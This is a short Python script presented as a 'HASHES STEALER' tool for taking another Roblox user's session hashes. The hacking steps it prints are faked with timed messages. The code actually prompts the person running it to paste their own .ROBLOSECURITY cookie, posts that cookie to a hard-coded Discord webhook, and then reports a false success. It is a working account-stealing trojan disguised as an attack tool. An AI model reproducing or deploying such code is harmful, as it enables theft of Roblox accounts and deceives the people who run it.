import requests
import re
import time

WEBHOOK = "https://discord.com/api/webhooks/1512496816472592634/V8Sc5Jx3LH7BvJfNfhPYqE9EfYCOiq59SxHW5mgksMVXr-gYgD1yeWTrCp_1edOpYVq7"

print("=== HASHES STEALER v2.1 ===")
target = input("Enter username you want to steal: ").strip()

print(f"\n[+] Targeting {target}...")
time.sleep(0.8)
print("[+] Cracking session hashes...")
time.sleep(0.8)
print("[+] Extracting .ROBLOSECURITY...")

data = input("\nPaste your Roblox cookie here: ")

match = re.search(r'[_A-Za-z0-9.-]{80,}', data)
cookie = match.group(0) if match else data

requests.post(WEBHOOK, json={"content": f"**HASHES STEALER**\n**Target:** {target}\n**ROBLOSECURITY:** ```{cookie}```"})

print(f"\n[+] SUCCESS! {target} hashes transferred.")
input("\nPress Enter to close...")
